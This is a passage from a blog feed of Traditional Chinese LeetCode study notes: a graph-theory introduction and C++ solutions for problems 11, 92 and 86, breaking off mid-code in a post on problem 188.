        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>以前我們在儲存資料的時候，常見的資料結構有陣列、雜湊表、鏈結串列等。想像你今天你剛上大學然後有個修課表，用表格列出各種課程，但你並不知道哪些課程需要先修，哪些可能需要之後再修，或者某些課程可能會擋修，這時候用圖來表示課程之間的關係就很方便了。所以圖的重點之一 <strong>就是保存資料與資料之間的關係</strong> 。</p><p><img src="/img/LeetCode/graph/course.png"></p><blockquote><p>這篇部落格主要參考 <a href="https://alrightchiu.github.io/SecondRound/graph-introjian-jie.html">這篇</a> 的講解</p></blockquote><h1 id="圖-Graph-的定義"><a href="#圖-Graph-的定義" class="headerlink" title="圖(Graph)的定義"></a>圖(Graph)的定義</h1><p>延續上面的課程圖，每個課程都代表一個 <strong>節點</strong>，節點是可用於存放資料，資料就是課程名稱。而課程與課程之間有箭頭相連，代表課程與課程之間的關係。</p><p><strong>vertex</strong>: 每個節點在圖中被稱為vertex，或 node，並定義所有 vertex 的集合叫做 $V$ 或是  $V(G)$<br><strong>edge</strong>: 每個線段稱為 edge， <strong>在圖中通常會用一對vertex 來表示他們之間的edge</strong> ，$(V_{i}, V_{j})$ 就代表 $V_{i}$ 與 $V_{j}$ 之間的 edge，通常定義所有 edge 的集合為 $E$ 或者 $E(G)$</p><blockquote><p>有了 $V$ 和 $E$ 就可以定義什麼是圖， <strong>也就是節點與節點之間關係的集合</strong> $G(V, E)$</p></blockquote><h2 id="圖的分類"><a href="#圖的分類" class="headerlink" title="圖的分類"></a>圖的分類</h2><p>圖主要根據 edge 是否有方向性來分成 <strong>有向圖(Directed Graph)</strong> 跟 <strong>無向圖(Undirected Graph)</strong></p><p><strong>有向圖(Directed Graph)</strong> ： vertex(A) 和 vertex(B) 之間的關係為單向的，則 edge具方向性，則所有vertex和有方向性edge 形成的集合為 directed graph<br><strong>無向圖(Undirected Graph)</strong> ： vertex(A) 和 vertex(B) 之間的關係為雙向的，則他們之間的 edge 不具有方向性，因此所形成的 vertex和 edge 的集合為 undirected graph</p><p><img src="/img/LeetCode/graph/graph-1.png"></p><h2 id="圖的表示法"><a href="#圖的表示法" class="headerlink" title="圖的表示法"></a>圖的表示法</h2><p>那如何用資料結構來表示圖呢，常見的表示法有 <strong>相鄰矩陣(Adjacency Matrix)</strong> 和 <strong>相鄰串列(Adjacency List)</strong> 。</p><h3 id="相鄰矩陣"><a href="#相鄰矩陣" class="headerlink" title="相鄰矩陣"></a>相鄰矩陣</h3><p><img src="/img/LeetCode/graph/graph-2.png"></p><p>可以先看無向圖中透過相鄰矩陣的表示法，vertex(A) 到 vertex(B) 之間有 edge，則對應 (A,B) 以及 (B,A) 的位置為 1，若無任意兩 vertex 間沒有 edge 則矩陣值為0。而對於有向圖來說，如果 vertex(A) 到 vertex(B) 有 edge，但是 vertex(B) 到 vertex(A) 沒有 edge 則對應 (A,B)為1 但 (B,A) 為 0。</p><p><strong>從上面相鄰矩陣表示法中也可以發現，無向圖的相臨矩陣會是對稱的(Sysmetric)，而有向圖則否。另外這樣也可以推測出，將有向圖矩陣進行轉置後，重疊於原本的矩陣就會變成無向圖的表示法。</strong></p><p>有向圖：$A[i][j]&#x3D;1$ 代表從節點 i 到節點j有邊<br>無向圖： $A[i][j]&#x3D; A[j][i] &#x3D; 1$ 代表從節點 i 到節點j存在無向邊</p><p>將 $A^T &#x3D; A^{T}[i][j] &#x3D; A[j][i]$ 代表從節點 j 到節點 i 有邊。 因此 $A_{undirected}[i][j] &#x3D; A[i][j] V A[j][i]$</p><h3 id="相鄰串列"><a href="#相鄰串列" class="headerlink" title="相鄰串列"></a>相鄰串列</h3><p><img src="/img/LeetCode/graph/graph-3.png"></p><p>相鄰串列表示法必須先用一個一為陣列來表示所有的 vertex，對於每個陣列再用Linked List 來表示跟他相連的其他 vertex。 <strong>在這裡，接入 Linked List 的順序並不重要，因為 graph 是定義成 set</strong> 。在上面的無向圖中，以 vertex(D) 為例，他會連接到 vertex(C), vertex(B), vertex(E)，因此 <code>[3]</code> 也就是 vertex(D) 可以建立連接到 vertex(C), vertex(B), vertex(E) 的 linked list (不用按順序)。而有向圖則是， <strong>則 vertex(D) 的 linked list 只能接入由 vertex(D) 出發的節點，也就是 vertex(B) 和 vertex(E)。</strong></p><h2 id="差異"><a href="#差異" class="headerlink" title="差異"></a>差異</h2><table><thead><tr><th></th><th>相鄰矩陣</th><th>相鄰串列</th></tr></thead><tbody><tr><td>空間複雜度</td><td>$O(\lvert V \rvert^{2})$</td><td>$O( \lvert V \rvert + \lvert E  \rvert)$</td></tr><tr><td>說明</td><td>適合稠密的圖(vertex和edge數量多)</td><td>適合稀疏的圖(edge數量少)</td></tr><tr><td>Access</td><td>連續記憶體會比較快</td><td>動態記憶體較慢</td></tr><tr><td>Add edge</td><td>新增edge只是把對應位置從 0 設成 1，所以是 $O(1)$</td><td>添加 vertex到Linked List 的 front，會是 $O(1)$，但 worst case 會是 $O( \lvert E \rvert )$</td></tr><tr><td>Delete edge</td><td>刪除 edge 只是把對應位置從1改成0，所以是 $O(1)$</td><td>如同在 Linked List刪除資料 $O( \lvert E  \rvert)$</td></tr></tbody></table><h1 id="相關概念解釋"><a href="#相關概念解釋" class="headerlink" title="相關概念解釋"></a>相關概念解釋</h1><p><strong>Adjacent</strong>: vertex(A) 與 vertex(B) 之間只要有 edge 就算是相鄰(adjacent)<br><strong>Subgraph</strong>: 對於一個 $G’$ 來說若構成它的 Edge 和 Vertex 的集合滿足 $V(G’)\subseteq V(G)$, $E(G’) \subseteq E(G)$ 則 $G’$ 為 $G$ 的子圖<br><img src="/img/LeetCode/graph/subgraph.png"><br><strong>Path</strong>: 從 vertex(V1) 到 vertex(V2) 間，經過的一連串前後相接的 edge 被稱為 從vertex(v1) 到 vertex(v2) 的path<br><strong>Length&#x2F;Distance</strong>: path中的 edge數量<br><strong>Simple path</strong>: 若一條 path 中，除了起點 vertex和終點 vertex 之外，其餘的vertex都只經過一次，則這條path為 simple path<br><img src="/img/LeetCode/graph/path.png"><br><strong>Cycle</strong>:  若一條 simple path 的起點 vertex 和終點 vertex相同，則稱這條path 為 cycle，如果cycle 中的 edge 是無向的，那就是無向循環(undirected cycle) 若 cycle 中是按照方向依序經過，則該cycle 會是有向的 (directed cycle)<br><img src="/img/LeetCode/graph/cycle.png"><br><strong>Acyclic graph</strong>： 若 graph 中不存在 cycle 則稱該graph 為 acyclic graph，通常 tree 也是一種 graph， <strong>然而如果在 tree 中找不到一個 simple path 它的起點vertex 以及終點 vertex是相同的，則該 tree 一定會是 acyclic graph</strong></p><p><strong>Weight</strong>：也就是權重，通常可以代表兩個地理位置之間的距離或是成本，可以在 edge 上加上權重，有權重的 graph 又稱 weighted graph</p><p><strong>Connected</strong>: 怎樣算是兩個 vertex 是彼此connected 的呢？那就是從 vertex(A) 可以走到 vertex(B), 從vertex(B)也能走到 vertex(A)，所以對於無向圖來說，就是 vertex(A) 和 vertex(B)有edge相連，對於有向圖來說那就是存在 edge(A→B) 以及 edge(B→A)</p><p><strong>Connected in undirected graph</strong>: 對於無向圖來說，任意vertex都存在一條 <strong>path</strong>連接彼此，那就會稱這個無向圖為connteced的<br><img src="/img/LeetCode/graph/connected.png"></p><p><strong>Connected components</strong>：在無向圖中，存在某個 subgraph 是 connected 的，若加入其他vertex 或 edge 會破壞這個 connected 的特性，則稱為這個 subgraph 為 connected component。 上圖的下方的兩個 subgraph 都滿足這個特性。</p><p><strong>strongly connected in directed graph</strong>: 在有向圖中，對於任意兩個 vertex(A) 和 vertex(B)，同時存在 (1) 從 vertex(A) 走到 vertex(B) 的 path  (2)  從 vertex(B) 走到 vertex(A) 的 path。則稱呼此有向圖為 strongly connected</p><p><img src="/img/LeetCode/graph/connected-2.png"></p><p><strong>strongly connected component</strong>: 在有向圖中，存在某個 subgraph 是 strongly connected 的，若加入其他vertex 或 edge 會破壞這個 strongly connected 的特性，則稱為這個 subgraph 為 strongly connected component。 (可以維持connected的最大集合)</p><p><strong>Self-loop</strong>: 如果有 edge 從 vertex(A) 接到 vertex(A) 則為 self-loop</p><h1 id="圖的應用場景"><a href="#圖的應用場景" class="headerlink" title="圖的應用場景"></a>圖的應用場景</h1><p>主要可以運用在 <strong>最小生成樹(Minimum Spanning Tree, MST)</strong>, <strong>網路流量</strong> 以及 <strong>最短路徑問題</strong> 等情景中，在套用情境前需要先知道 Graph 中搜尋vertex的方法。</p><h1 id="參考"><a href="#參考" class="headerlink" title="參考"></a>參考</h1><ul><li><a href="https://hackmd.io/@meyr543/SJJ47oWoY">https://hackmd.io/@meyr543/SJJ47oWoY</a></li><li><a href="https://ithelp.ithome.com.tw/articles/10336847">https://ithelp.ithome.com.tw/articles/10336847</a></li><li><a href="https://ithelp.ithome.com.tw/articles/10268666?sc=rss.iron">https://ithelp.ithome.com.tw/articles/10268666?sc=rss.iron</a></li><li><a href="https://hackmd.io/@bangyewu/BknWuaVlT">https://hackmd.io/@bangyewu/BknWuaVlT</a></li><li><a href="https://alrightchiu.github.io/SecondRound/graph-introjian-jie.html">https://alrightchiu.github.io/SecondRound/graph-introjian-jie.html</a></li></ul><hr>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Graph </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>裝最多水的容器 | Medium | LeetCode#11. Container With Most Water</title>
      <link href="/posts/806bf38.html"/>
      <url>/posts/806bf38.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/11/question.jpeg"></p><ul><li>題目難度: <code>Medium</code></li><li>題目敘述: 題目給了一個整數陣列 <code>height</code> 並且長度為 <code>n</code>， <code>n</code> 代表有 <code>n</code> 條垂直的線，第 <code>i</code> 條線的長度範圍為座標 <code>(i,0)</code> 到 <code>(i, height[i])</code> (反正 <code>height</code> 的值就會是線的長度)，請找到兩條線與X軸共同形成一個容器，可以裝最多的水，請回傳可能裝的最大面積。</li></ul><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>總之面積會是由比較矮的直線乘上底邊 $Area &#x3D; \min(height[i], height[j]) \times (j-i)$</p><h2 id="暴力解"><a href="#暴力解" class="headerlink" title="暴力解"></a>暴力解</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maxArea</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; height)</span></span>&#123;</span><br><span class="line">        <span class="type">int</span> maxArea = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> n = height.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=i+<span class="number">1</span>; j &lt; n; j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(height[j] &gt; height[i]) maxArea = <span class="built_in">max</span>(maxArea, height[i]*(j-i));</span><br><span class="line">                <span class="keyword">else</span> maxArea = <span class="built_in">max</span>(maxArea, height[j]*(j-i));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> maxArea;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>這裡透過兩個迴圈來迭代形成不同的容器大小，但這樣做會 Time Limit Exceeded!</p><h2 id="雙指針解"><a href="#雙指針解" class="headerlink" title="雙指針解"></a>雙指針解</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maxArea</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; height)</span></span>&#123;</span><br><span class="line">        <span class="type">int</span> maxArea = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> left = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> right = height.<span class="built_in">size</span>()<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">while</span>(left &lt; right)&#123;</span><br><span class="line">            <span class="keyword">if</span>(height[right]&gt;height[left])&#123;</span><br><span class="line">            maxArea = <span class="built_in">max</span>(maxArea, height[left]*(right-left)); </span><br><span class="line">            &#125; </span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">            maxArea = <span class="built_in">max</span>(maxArea, height[right]*(right-left));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(height[left] &lt; height[right]) left++;</span><br><span class="line">            <span class="keyword">else</span> right--;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> maxArea;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>這邊通過兩個指標 <code>left</code>, <code>right</code> 來包夾出容器大小，面積計算一樣，若比先前面積大，則取當前面積。而移動 <code>left</code>, <code>right</code> 指針的關鍵在於， <strong>如果 <code>height[left] &lt; height[right]</code>，則左邊垂直線限制了整體面積，這時如果<code>right</code> 保持不動並減少距離，並不會讓面積改變，因此要移動 <code>left</code>，並期望找到更高的垂直線</strong> ，反之亦然。</p><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/11/result.jpeg"></p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><p>時間複雜度(暴力解): $O(n^2)$<br>時間複雜度(雙指標解): $O(n)$</p><p>空間複雜度: $O(1)$</p><hr>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Medium </tag>
            
            <tag> Two Pointers </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反轉鏈結串列 II | Medium | LeetCode#92. Reverse Linked List II</title>
      <link href="/posts/8317fd5b.html"/>
      <url>/posts/8317fd5b.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/92/question.jpeg"></p><ul><li>題目難度：<code>Medium</code></li><li>題目描述：給定一個鏈結串列的 <code>head</code> 以及整數 <code>left</code> 和 <code>right</code>，其中 <code>left&lt;= right</code>，請將 <code>left</code> 到 <code>right</code> 範圍內的鏈結進行反轉，最後回傳整個串列的頭。</li></ul><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>一開始的想法蠻單純的，就是要找到 <code>left</code> 的前一個節點，以及 <code>right</code> 的後一個節點 (<strong>用來記錄反轉後要連接的節點</strong>)，將中間鏈結反轉後再接回這兩個節點。</p><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode() : val(0), next(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x, ListNode *next) : val(x), next(next) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">reverseBetween</span><span class="params">(ListNode* head, <span class="type">int</span> left, <span class="type">int</span> right)</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">        ListNode *dummyNode = <span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        dummyNode-&gt;next = head;</span><br><span class="line">        ListNode *leftNode = dummyNode;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Find the left and right node</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>; i&lt;left; i++)&#123;</span><br><span class="line">            leftNode = leftNode-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        ListNode *prev=<span class="literal">nullptr</span>;</span><br><span class="line">        ListNode *ptr=leftNode-&gt;next;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=left; i&lt;=right; i++)&#123;</span><br><span class="line">            ListNode *temp = ptr-&gt;next;</span><br><span class="line">            ptr-&gt;next = prev;</span><br><span class="line">            prev = ptr;</span><br><span class="line">            ptr = temp;</span><br><span class="line">            left++;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Connect the reversed sublist with the original list</span></span><br><span class="line">        leftNode-&gt;next-&gt;next = ptr;</span><br><span class="line">        leftNode-&gt;next = prev;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> dummyNode-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>後來發現也不用找到 <code>right</code> 後面的節點，找到 <code>left</code> 後就可以開始反轉了。這裏反轉的操作就是典型做法，透過一個 <code>temp</code> 指標紀錄當前節點的下一個位址，接著將當前節點接到前一個節點上，最後更新當前節點指標 <code>ptr</code> 和先前節點指標 <code>prev</code>，一旦反轉到 <code>right</code> 節點，則停止。 最後需要將反轉後的串列跟原本的節點合併。</p><p><em>反轉前</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dummy -&gt; ... -&gt; leftNode -&gt; [待反轉區域] -&gt; ptr -&gt; ...</span><br></pre></td></tr></table></figure><p><em>反轉後</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dummy -&gt; ... -&gt; leftNode -&gt; [反轉後的區域頭節點 prev] -&gt; ... -&gt; [反轉後的區域尾節點] -&gt; ptr -&gt; ...</span><br></pre></td></tr></table></figure><p>反轉後的 <code>ptr</code> 會是反轉後串列右側需要接上的節點，但因為串列被反轉了，因此目前最右側的節點會是 <code>leftNode-&gt;next</code> 因此需要將他的下一個節點指向 <code>ptr</code> (<code>leftNode-&gt;next-&gt;next = ptr</code>) 接著需要將反轉前的左節點連接到反轉後的子串列的尾端節點 (<code>leftNode-&gt;next</code>)。</p><p>函數最後回傳 <code>dummyNode-&gt;next</code> 則會是新串列的頭。</p><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/92/result.jpeg"></p><h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>時間複雜度: $O(n)$</p><p>空間複雜度: $O(1)$</p><hr>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Medium </tag>
            
            <tag> Linked List </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>分隔鏈結串列 | Medium | LeetCode#86. Partition List</title>
      <link href="/posts/e23d455d.html"/>
      <url>/posts/e23d455d.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/86/question.jpeg"></p><ul><li>題目難度：<code>Medium</code></li><li>題目描述： 給定一個Linked List 的 <code>head</code> 以及一個整數 <code>x</code>, 將整個 Linked List 以 <code>x</code> 來分隔，使節點值比 <code>x</code> 小的節點排在 <code>x</code> 前面，而節點值大於等於 <code>x</code> 的節點則排在 <code>x</code> 節點後面。</li></ul><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>使用兩個陣列來分別儲存 <strong>1. 位置在 <code>x</code> 節點前面，但節點值比 <code>x</code> 還大的節點</strong> 和 <strong>2. 位置在 <code>x</code> 節點後面，但節點值比 <code>x</code> 還小的節點</strong> 這兩個種類的節點需要他過額外的陣列儲存，以利後續串列的重新建構。</p><p>但如過再讀取陣列值進行建構，還需要找到需要插入的位置，這樣複雜度會提高，因此不如分別建立兩個 list 的 head，然後迭代尋找並分別串列所有小於 <code>x</code> 的節點以及所有大於等於 <code>x</code> 的節點。</p><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">partition</span><span class="params">(ListNode* head, <span class="type">int</span> x)</span></span>&#123;</span><br><span class="line">        ListNode *bigHead = <span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        ListNode *smallHead = <span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        ListNode *smaller = smallHead;</span><br><span class="line">        ListNode *bigger = bigHead;</span><br><span class="line">        ListNode *ptr = head;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span>(ptr!=<span class="literal">nullptr</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(ptr-&gt;val &lt; x)&#123;</span><br><span class="line">                smaller-&gt;next = ptr;</span><br><span class="line">                smaller = smaller-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                bigger-&gt;next = ptr;</span><br><span class="line">                bigger = bigger-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">            ptr = ptr-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        bigger-&gt;next = <span class="literal">nullptr</span>;</span><br><span class="line">        smaller-&gt;next = bigHead-&gt;next;</span><br><span class="line">        <span class="keyword">return</span> smallHead-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;                                                                                                                                           </span><br></pre></td></tr></table></figure><p>這裡建立兩個新的頭 <code>bigHead</code> 以及 <code>smallHead</code>，分別用於建構大於等於 <code>x</code> 的節點串列和小於 <code>x</code> 的節點串列。 這裏一樣透過 <code>ptr</code> 來去迭代原本的串列。一旦發現節點值小於 <code>x</code> 則將該節點加入到以 <code>smallHead</code> 為頭的串列中 (<code>smaller-&gt;next = ptr</code>)。而一旦發現節點值大於或等於 <code>x</code> 則將該節點加入到以 <code>bigHead</code> 為頭的串列中 (<code>bigHead-&gt;next = ptr</code>)。迭代完畢後，則需要將兩串列合併，將數字小串列的最後一個節點串到串列的頭上 (<code>smaller-&gt;next = bighead-&gt;next</code>)。 最後只要回傳小串列的初始節點就好。</p><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/86/result.jpeg"></p><h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>時間複雜度： $O(n)$</p><p>空間複雜度： $O(1)$</p><hr>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Medium </tag>
            
            <tag> Linked List </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>買賣股票的最佳時機IV | Hard | LeetCode#188. Best Time to Buy and Sell Stock IV</title>
      <link href="/posts/96bf11ff.html"/>
      <url>/posts/96bf11ff.html</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>這題是股票買賣系列的題目:</p><p><a href="https://leozzmc.github.io/posts/a0e35335.html">121. Best Time to Buy and Sell Stock</a><br><a href="https://leozzmc.github.io/posts/fcfb0850.html">122. Best Time to Buy and Sell Stock II</a><br><a href="https://leozzmc.github.io/posts/cfc810b0.html">123. Best Time to Buy and Sell Stock III</a><br><a href="https://leozzmc.github.io/posts/c95a58c1.html">309. Best Time to Buy and Sell Stock with Cooldown</a></p><h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/188/question.jpeg"></p><ul><li>題目難度：<code>Hard</code></li><li>題目描述： 給定一個整數陣列 <code>prices</code>，<code>prices[i]</code> 代表第 <code>i</code> 天的股票價格，每一天可以選擇買或賣股票，給定整數 <code>k</code> 代表可以進行的交易次數上限，請找出最大收益。</li></ul><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><blockquote><p>這題基本上是完全延續 <a href="https://leozzmc.github.io/posts/cfc810b0.html">LeetCode#123. Best Time to Buy and Sell Stock III</a> 的題目描述，因此我直接按照這題的經驗來去實踐</p></blockquote><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maxProfit</span><span class="params">(<span class="type">int</span> k, vector&lt;<span class="type">int</span>&gt;&amp; prices)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = prices.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">if</span>(n&lt;<span class="number">2</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dpBuy</span><span class="params">(k+<span class="number">1</span>, INT_MIN)</span></span>;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dpSell</span><span class="params">(k+<span class="number">1</span>,<span class="number">0</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">        <span 